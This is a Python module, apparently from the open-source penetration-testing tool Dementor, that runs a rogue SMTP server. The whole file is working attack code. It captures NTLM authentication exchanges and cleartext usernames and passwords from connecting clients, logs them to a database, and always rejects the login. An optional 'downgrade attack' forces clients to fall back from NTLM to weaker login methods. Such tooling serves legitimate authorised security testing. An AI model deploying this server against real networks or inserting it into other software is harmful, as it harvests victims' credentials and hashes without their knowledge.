# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: reportUninitializedInstanceVariable=false
# Reference:
#   - https://winprotocoldocs-bhdugrdyduf5h2e4.b02.azurefd.net/MS-SMTPNTLM/%5bMS-SMTPNTLM%5d.pdf
import typing
import warnings
import base64
import binascii
import ssl

from typing import Any, NamedTuple
from typing_extensions import override

# SMTP server
from aiosmtpd.smtp import (
    MISSING,
    SMTP as SMTPServerBase,
    AuthResult,
    Session,
    Envelope,
    LoginPassword,
    _Missing,
)
from aiosmtpd.controller import Controller

from impacket.ntlm import (
    NTLMAuthChallengeResponse,
    NTLMAuthNegotiate,
)

from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.session import SessionConfig
from dementor.log.logger import ProtocolLogger, dm_logger
from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    NTLM_report_auth,
    ATTR_NTLM_CHALLENGE,
    ATTR_NTLM_DISABLE_ESS,
    ATTR_NTLM_DISABLE_NTLMV2,
)
from dementor.db import _CLEARTEXT
from dementor.servers import AsyncServerThread
from dementor.loader import BaseProtocolModule, DEFAULT_ATTR

__proto__ = ["SMTP"]

# removes explicit warning messages from aiosmtpd
warnings.simplefilter("ignore")

# 2.2.1.4 SMTP_AUTH_Fail_Response Message
# SMTP_AUTH_Fail_Response is defined as follows. This message, identified by the 535 status code, is
# defined in [RFC2554] section 4, and indicates that the authentication has terminated unsuccessfully
# because the user name or password is incorrect.
SMTP_AUTH_Fail_Response_Message = "535 5.7.3 Authentication unsuccessful"

# 2.2.1.2 SMTP_NTLM_Supported_Response Message
# The SMTP_NTLM_Supported_Response message indicates that the server supports NTLM
# authentication for SMTP.
SMTP_NTLM_Supported_Response_Message = "ntlm supported"

SMTP_AUTH_Result = AuthResult | None | _Missing | bool


class SMTPServerConfig(TomlConfig):
    _section_ = "SMTP"
    _fields_ = [
        A("smtp_port", "Port"),
        A("smtp_tls", "TLS", False),
        A("smtp_fqdn", "FQDN", "DEMENTOR", section_local=False),
        A("smtp_ident", "Ident", "Dementor 1.0dev0"),
        A("smtp_downgrade", "Downgrade", False),
        A("smtp_auth_mechanisms", "AuthMechanisms", list),
        A("smtp_require_auth", "RequireAUTH", False),
        A("smtp_require_starttls", "RequireSTARTTLS", False),
        A("smtp_tls_cert", "Cert", "", section_local=False),
        A("smtp_tls_key", "Key", "", section_local=False),
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_DISABLE_ESS,
        ATTR_NTLM_DISABLE_NTLMV2,
    ]

    if typing.TYPE_CHECKING:
        smtp_port: int
        smtp_tls: bool
        smtp_fqdn: str
        smtp_ident: str
        smtp_downgrade: bool
        smtp_auth_mechanisms: list[str]
        smtp_require_auth: bool
        smtp_require_starttls: bool
        smtp_tls_cert: str
        smtp_tls_key: str
        ntlm_challenge: bytes
        ntlm_disable_ess: bool
        ntlm_disable_ntlmv2: bool


class SMTP(BaseProtocolModule[SMTPServerConfig]):
    name = "SMTP"
    config_ty = SMTPServerConfig
    config_attr = "smtp_servers"
    config_enabled_attr = DEFAULT_ATTR
    config_list = True

    @override
    def create_server_thread(self, session, server_config):
        return SMTPServerThread(session, server_config)


# Authentication class used in the custom authenticator after successful
# NTLM authentication
class NTLMAuth(NamedTuple):
    domain_name: str
    user_name: str
    hash_version: str
    hash_string: str

    def get_user_string(self) -> str:
        return f"{self.domain_name}/{self.user_name}"


class SMTPDefaultAuthenticator:
    def __init__(self, logger, config: SessionConfig) -> None:
        self.logger = logger
        self.config = config

    def __call__(
        self,
        server: SMTPServerBase,
        session: Session,
        envelope: Envelope,
        mechanism: str,
        auth_data: LoginPassword | NTLMAuth,
    ) -> AuthResult:
        match auth_data:
            case NTLMAuth():
                # successful NTLM authentication
                # self.config.db.add_auth(
                #     client=session.peer,
                #     credtype=auth_data.hash_version,
                #     password=auth_data.hash_string,
                #     logger=self.logger,
                #     username=auth_data.user_name,
                #     domain=auth_data.domain_name,
                # )
                pass

            case LoginPassword():
                # plain or LOGIN authentication
                username = auth_data.login.decode(errors="replace")
                password = auth_data.password.decode(errors="replace")
                self.config.db.add_auth(
                    client=session.peer,
                    credtype=_CLEARTEXT,
                    password=password,
                    logger=self.logger,
                    username=username,
                )

        # always return false - we don't support authentication
        return AuthResult(success=False)


class SMTPServerHandler:
    def __init__(
        self, config: SessionConfig, server_config: SMTPServerConfig, logger
    ) -> None:
        self.config = config
        self.server_config = server_config
        self.logger = logger

    # add explicit support for lowercase authentication
    async def auth_login(
        self, server: SMTPServerBase, args: list[str]
    ) -> SMTP_AUTH_Result:
        return await server.auth_LOGIN(server, args)

    async def auth_plain(
        self, server: SMTPServerBase, args: list[str]
    ) -> SMTP_AUTH_Result:
        return await server.auth_PLAIN(server, args)

    async def auth_ntlm(
        self, server: SMTPServerBase, args: list[str]
    ) -> SMTP_AUTH_Result:
        return await self.auth_NTLM(server, args)

    async def auth_NTLM(
        self, server: SMTPServerBase, args: list[bytes]
    ) -> SMTP_AUTH_Result:
        login = None
        match len(args):
            case 1:
                # Client sends "AUTH NTLM"
                login = await self.chapture_ntlm_auth(server)

            case 2:
                # The client sends an SMTP_AUTH_NTLM_BLOB_Command message containing a base64-encoded
                # NTLM NEGOTIATE_MESSAGE.
                try:
                    decoded_blob = base64.b64decode(args[1], validate=True)
                except binascii.Error:
                    self.logger.debug(
                        f"Could not parse input NTLM negotiate: {args[1]}",
                    )
                    await server.push("501 5.7.0 Auth aborted")
                    return MISSING
                # perform authentication with negotiation message
                login = await self.chapture_ntlm_auth(server, blob=decoded_blob)

        if login is MISSING:
            return AuthResult(success=False, handled=True)
        # TODO: error population
        return login

    async def chapture_ntlm_auth(self, server: SMTPServerBase, blob=None) -> Any:
        if blob is None:
            # 4. The server sends the SMTP_NTLM_Supported_Response message, indicating that it can perform
            # NTLM authentication.
            blob = await server.challenge_auth(SMTP_NTLM_Supported_Response_Message)
            if blob is MISSING:
                # authentication failed
                await server.push("501 5.7.0 Auth aborted")
                return MISSING

        negotiate_message = NTLMAuthNegotiate()
        negotiate_message.fromString(blob)

        if self.server_config.smtp_fqdn.count(".") > 0:
            name, domain = self.server_config.smtp_fqdn.split(".", 1)
        else:
            name, domain = self.server_config.smtp_fqdn, ""

        # now we can build the challenge using the answer flags
        ntlm_challenge = NTLM_AUTH_CreateChallenge(
            negotiate_message,
            name,
            domain,
            challenge=self.server_config.ntlm_challenge,
            disable_ess=self.server_config.ntlm_disable_ess,
            disable_ntlmv2=self.server_config.ntlm_disable_ntlmv2,
        )

        # 6. The server sends an SMTP_AUTH_NTLM_BLOB_Response message containing a base64-encoded
        # NTLM CHALLENGE_MESSAGE.
        blob = await server.challenge_auth(ntlm_challenge.getData())

        # 7. The client sends an SMTP_AUTH_NTLM_BLOB_Command message containing a base64-encoded
        # NTLM AUTHENTICATE_MESSAGE.
        auth_message = NTLMAuthChallengeResponse()
        auth_message.fromString(blob)
        NTLM_report_auth(
            auth_message,
            self.server_config.ntlm_challenge,
            server.session.peer,
            self.config,
            self.logger,
        )
        if self.server_config.smtp_downgrade:
            # Perform a simple donẃngrade attack by sending failed authentication
            #  - Some clients may choose to use fall back to other login mechanisms
            #    provided by the server
            self.logger.display(
                f"Performing downgrade attack for target {server.session.peer[0]}",
                host=server.session.peer[0],
            )
            await server.push(SMTP_AUTH_Fail_Response_Message)
            return None  # unsuccessful, but handled

        # by default, accept this client
        return AuthResult(success=True, handled=False)


class SMTPServerThread(AsyncServerThread[SMTPServerConfig]):
    def __init__(self, config: SessionConfig, server_config: SMTPServerConfig):
        super().__init__(config, server_config)
        self.controller: Controller | None = None
        self._running = False

    @override
    def is_running(self):
        return self._running

    def get_service_name(self) -> str:
        return "SMTPS" if self.server_config.smtp_tls else "SMTP"

    def get_port(self):
        return self.server_config.smtp_port

    def create_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "SMTP",
                "protocol_color": "light_goldenrod2",
            }
        )

    async def start_server(
        self, controller: Controller, config: SessionConfig, smtp_config
    ):
        controller.port = smtp_config.smtp_port

        # NOTE: hostname on the controller points to the local address that will be
        # bound and the SMTP hostname is just a string that will be sent to the client,
        # TODO: fix ipv6 support
        controller.hostname = "" if config.ipv6_support else config.ipv4
        self.address = controller.hostname

        # alter the server hostname
        controller.SMTP_kwargs["hostname"] = smtp_config.smtp_fqdn.split(".", 1)[0]

        label = "SMTP" if not smtp_config.smtp_tls else "SMTPS"
        try:
            dm_logger.debug(
                f"Starting {label} server on {controller.hostname}:{smtp_config.smtp_port}"
            )
            self._running = True
            controller.start()
        except OSError as e:
            dm_logger.error(
                f"Failed to start {label} server on {self.config.ipv4}:{smtp_config.smtp_port} -> {e.strerror}",
            )
            self._running = False

    async def arun(self) -> None:
        # setup server
        server = self.server_config
        logger = self.create_logger()
        logger.extra["port"] = server.smtp_port  # ty:ignore[invalid-assignment]

        mechanisms = {"PLAIN", "NTLM", "LOGIN"} - set(server.smtp_auth_mechanisms)
        mechanisms.update([x.lower() for x in mechanisms])
        tls_context = None
        if server.smtp_tls:
            # TODO: add error handler
            tls_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            tls_context.load_cert_chain(server.smtp_tls_cert, server.smtp_tls_key)

        self.controller = Controller(
            SMTPServerHandler(self.config, server, logger),
            auth_require_tls=False,
            authenticator=SMTPDefaultAuthenticator(logger, self.config),
            ident=server.smtp_ident,
            auth_exclude_mechanism=mechanisms,
            auth_required=server.smtp_require_auth,
            tls_context=tls_context,
            require_starttls=server.smtp_require_starttls,
        )
        await self.start_server(
            self.controller,
            self.config,
            server,
        )

    async def ashutdown(self) -> None:
        if self.controller:
            self.controller.stop()
            self._running = False
